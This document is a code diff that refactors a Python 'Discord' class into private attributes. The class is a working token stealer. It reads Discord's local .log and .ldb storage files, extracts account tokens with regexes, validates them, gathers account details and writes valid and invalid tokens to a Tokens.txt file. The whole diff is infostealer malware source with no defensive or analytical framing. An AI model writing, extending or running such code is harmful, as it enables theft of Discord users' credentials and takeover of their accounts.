@@ -11,14 +11,15 @@ class Discord:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
-        self.config = DiscordConfig()
-        self.storage_path = storage_path
-        self.folder = folder
-        self.errors = errors
+        self.__storage_path = storage_path
+        self.__folder = folder
+        self.__errors = errors
+
+        self.__config = DiscordConfig()
 
     def __create_folder(self):
 
-        folder = rf"{self.storage_path}\{self.folder}"
+        folder = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(folder):
             makedirs(folder)
@@ -27,7 +28,7 @@ class Discord:
 
         headers = {
             "Content-Type": content_type,
-            "User-Agent": self.config.UserAgent
+            "User-Agent": self.__config.UserAgent
         }
 
         if token is not None:
@@ -45,7 +46,7 @@ class Discord:
 
     def __get_tokens(self):
 
-        if not path.exists(self.config.TokensPath):
+        if not path.exists(self.__config.TokensPath):
             return
 
         tokens = []
@@ -53,12 +54,12 @@ class Discord:
         self.valid = []
         self.invalid = []
 
-        for file in listdir(self.config.TokensPath):
+        for file in listdir(self.__config.TokensPath):
 
             if file[-4:] not in [".log", ".ldb"]:
                 continue
 
-            for data in [line.strip() for line in open(rf"{self.config.TokensPath}\{file}", "r", errors="ignore", encoding="utf-8").readlines()]:
+            for data in [line.strip() for line in open(rf"{self.__config.TokensPath}\{file}", "r", errors="ignore", encoding="utf-8").readlines()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                     [tokens.append(item) for item in findall(regex, data)]
 
@@ -82,7 +83,7 @@ class Discord:
 
         for result in self.valid:
             storage = loads(result[1].read().decode("utf-8"))
-            data = self.config.DiscordData
+            data = self.__config.DiscordData
 
             temp.append(data.format(
                 storage["username"] if storage["username"] else "No data",
@@ -92,7 +93,7 @@ class Discord:
                 result[0]
             ))
 
-        with open(rf"{self.storage_path}\{self.folder}\Tokens.txt", "a", encoding="utf-8") as discord:
+        with open(rf"{self.__storage_path}\{self.__folder}\Tokens.txt", "a", encoding="utf-8") as discord:
 
             discord.write("Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n")
             discord.write("".join(item for item in temp))
@@ -104,4 +105,4 @@ class Discord:
             self.__get_tokens()
 
         except Exception as e:
-            if self.errors is True: print(f"[Discord]: {repr(e)}")
+            if self.__errors is True: print(f"[Discord]: {repr(e)}")
